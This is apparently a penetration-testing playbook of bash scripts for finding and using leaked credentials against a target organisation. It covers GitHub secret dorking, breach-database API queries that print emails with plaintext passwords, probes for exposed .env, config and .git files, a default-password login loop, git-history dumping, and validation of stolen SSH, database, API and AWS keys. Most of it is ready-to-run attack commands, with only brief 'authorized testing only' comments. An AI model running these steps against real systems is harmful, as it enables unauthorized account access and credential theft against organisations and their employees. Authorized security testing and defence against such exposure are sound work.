# Playbook: Leaked Credentials Check

## Purpose
Search for leaked, exposed, or default credentials associated with target
infrastructure. Covers breach databases, code repositories, paste sites,
configuration files, and default credential testing.
Input: target domain, email list, or discovered service list.

---

## Step 1 — GitHub Credential Dorking

```bash
ORG="TARGET_ORG"
DOMAIN="TARGET"

# GitHub search dorks (use in browser or gh CLI)
DORKS=(
  "org:$ORG password"
  "org:$ORG secret"
  "org:$ORG api_key"
  "org:$ORG apikey"
  "org:$ORG token"
  "org:$ORG AWS_SECRET"
  "org:$ORG PRIVATE KEY"
  "org:$ORG credentials"
  "\"$DOMAIN\" password"
  "\"$DOMAIN\" api_key OR apikey OR api-key"
  "\"$DOMAIN\" DB_PASSWORD OR DATABASE_URL"
  "\"$DOMAIN\" SMTP_PASSWORD OR MAIL_PASSWORD"
  "\"$DOMAIN\" token OR secret"
  "\"$DOMAIN\" filename:.env"
  "\"$DOMAIN\" filename:.npmrc"
  "\"$DOMAIN\" filename:docker-compose.yml"
  "\"$DOMAIN\" filename:wp-config.php"
  "\"$DOMAIN\" filename:application.properties"
  "\"$DOMAIN\" filename:appsettings.json"
  "\"$DOMAIN\" filename:.htpasswd"
  "\"$DOMAIN\" filename:id_rsa"
)

echo "GitHub dorks to search:"
for dork in "${DORKS[@]}"; do
  echo "  https://github.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$dork'))")&type=code"
done

# Using truffleHog for automated scanning
trufflehog github --org="$ORG" --only-verified

# Using gitleaks
gitleaks detect --source="https://github.com/$ORG" --report-path=gitleaks_report.json
```

---

## Step 2 — Paste Site Monitoring

```bash
# Search paste sites for leaked credentials
# Automated tools:

# pspy / pastehunter
# Monitor pastebin, ghostbin, etc. for domain mentions

# Manual searches (use in browser):
PASTE_SEARCHES=(
  "https://www.google.com/search?q=site:pastebin.com+\"$DOMAIN\""
  "https://www.google.com/search?q=site:paste.ee+\"$DOMAIN\""
  "https://www.google.com/search?q=site:ghostbin.com+\"$DOMAIN\""
  "https://www.google.com/search?q=site:ideone.com+\"$DOMAIN\""
)

# Pastebin scraping (requires PRO account for search API)
# https://psbdmp.ws/api/search/$DOMAIN
curl -s "https://psbdmp.ws/api/search/$DOMAIN" | python3 -m json.tool 2>/dev/null
```

---

## Step 3 — Breach Database Search

```bash
# h8mail — comprehensive breach check
h8mail -t emails.txt --loose -o breach_report.txt

# Dehashed API
DEHASHED_EMAIL="YOUR_EMAIL"
DEHASHED_KEY="YOUR_API_KEY"
curl -s -u "$DEHASHED_EMAIL:$DEHASHED_KEY" \
  "https://api.dehashed.com/search?query=domain:$DOMAIN&size=100" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f\"Total entries: {data.get('total', 0)}\")
for entry in data.get('entries', [])[:20]:
    email = entry.get('email', 'N/A')
    password = entry.get('password', '')
    hashed = entry.get('hashed_password', '')
    database = entry.get('database_name', 'unknown')
    cred = password if password else f'[hash:{hashed[:20]}...]' if hashed else 'N/A'
    print(f'  {email} | {cred} | Source: {database}')
"

# LeakCheck API
curl -s "https://leakcheck.io/api/public?check=$DOMAIN" | python3 -m json.tool

# Snusbase API
curl -s -X POST "https://api.snusbase.com/data/search" \
  -H "Auth: YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d "{\"terms\":[\"$DOMAIN\"],\"types\":[\"email\"],\"wildcard\":true}"
```

---

## Step 4 — Cloud and Config File Exposure

```bash
TARGET="https://TARGET"

# Environment files
PATHS=(
  "/.env"
  "/.env.bak"
  "/.env.old"
  "/.env.production"
  "/.env.local"
  "/.env.staging"
  "/env"
  "/config/.env"
  "/app/.env"
)

for path in "${PATHS[@]}"; do
  RESP=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}" "${TARGET}${path}")
  CODE=$(echo "$RESP" | cut -d: -f1)
  SIZE=$(echo "$RESP" | cut -d: -f2)
  [ "$CODE" = "200" ] && [ "$SIZE" -gt 10 ] && echo "[EXPOSED] ${path} ($SIZE bytes)"
done

# Configuration files
CONFIG_PATHS=(
  "/wp-config.php.bak"
  "/web.config"
  "/config.php.bak"
  "/database.yml"
  "/application.properties"
  "/appsettings.json"
  "/config/database.yml"
  "/conf/server.xml"
  "/.git/config"
  "/.svn/entries"
  "/.DS_Store"
  "/phpinfo.php"
  "/info.php"
  "/.htpasswd"
  "/crossdomain.xml"
)

for path in "${CONFIG_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${path}")
  [ "$CODE" = "200" ] && echo "[EXPOSED] ${path}"
done
```

---

## Step 5 — Default Credential Testing

```bash
# Test common default credentials on discovered services
# ONLY on authorized targets within scope

# Common web admin defaults
DEFAULTS=(
  "admin:admin"
  "admin:password"
  "admin:123456"
  "admin:admin123"
  "root:root"
  "root:toor"
  "test:test"
  "user:user"
  "demo:demo"
  "guest:guest"
)

# Service-specific defaults
# WordPress: admin/admin
# Tomcat Manager: tomcat/tomcat, admin/admin, manager/manager
# Jenkins: admin/admin (no auth by default)
# Grafana: admin/admin
# Kibana: elastic/changeme
# phpMyAdmin: root/(empty), root/root
# Joomla: admin/admin
# Drupal: admin/admin

# Example: test against login endpoint
ENDPOINT="https://TARGET/login"
for cred in "${DEFAULTS[@]}"; do
  USER=$(echo "$cred" | cut -d: -f1)
  PASS=$(echo "$cred" | cut -d: -f2)
  RESP=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "$ENDPOINT" \
    -d "username=${USER}&password=${PASS}")
  [ "$RESP" = "302" ] || [ "$RESP" = "200" ] && echo "[DEFAULT CRED] $USER:$PASS → $RESP"
done
```

---

## Step 6 — Git History Credential Search

```bash
# If .git is exposed
TARGET="https://TARGET"

# Check for .git exposure
curl -sk -o /dev/null -w "%{http_code}" "$TARGET/.git/HEAD"

# Download .git directory (if accessible)
# Using git-dumper
git-dumper "$TARGET/.git/" ./git_dump

# Search git history for credentials
cd git_dump
git log --all --oneline | head -50

# Search all commits for secrets
git log --all -p | grep -iE "(password|secret|api_key|token|credential)" | head -50

# Using truffleHog on local repo
trufflehog filesystem --directory=./git_dump --only-verified

# Using gitleaks on local repo
gitleaks detect --source=./git_dump --report-path=gitleaks_local.json
cd ..
```

---

## Step 7 — Credential Validation

```bash
# Validate discovered credentials (authorized testing only)

# SSH
# ssh -o BatchMode=yes -o ConnectTimeout=5 user@TARGET "echo ok" 2>/dev/null

# FTP
# curl -s -u "user:password" ftp://TARGET/ 2>/dev/null

# Database (only if in scope)
# mysql -h TARGET -u root -p'password' -e "SELECT 1" 2>/dev/null
# psql -h TARGET -U postgres -c "SELECT 1" 2>/dev/null

# API keys
# curl -s -H "Authorization: Bearer DISCOVERED_TOKEN" "https://TARGET/api/user"
# curl -s -H "X-API-Key: DISCOVERED_KEY" "https://TARGET/api/status"

# AWS credentials
# AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
```

---

## Output

```
TARGET        : example.com
SOURCES CHECKED:
  GitHub dorking       : 3 repos with exposed credentials
  Paste sites          : 1 paste with employee credentials
  Breach databases     : 12 emails in known breaches
  Config file exposure : .env file accessible (DB_PASSWORD exposed)
  Default credentials  : Grafana admin:admin works
  Git history          : AWS keys in commit 3 months ago

CRITICAL FINDINGS:
  1. .env file at /app/.env exposes DB password and JWT secret
  2. Grafana at /grafana uses default admin:admin
  3. AWS access key in GitHub commit (still valid)

SEVERITY      : CRITICAL
NEXT STEPS    : Report exposed credentials immediately,
                test credential reuse across services,
                check AWS key permissions with enumerate-iam
```

---

## Tools Reference

```bash
# truffleHog — credential scanner
pip install trufflehog

# gitleaks
go install github.com/gitleaks/gitleaks/v8@latest

# git-dumper — download exposed .git
pip install git-dumper

# h8mail — breach check
pip install h8mail

# enumerate-iam — AWS key permission check
pip install enumerate-iam
```
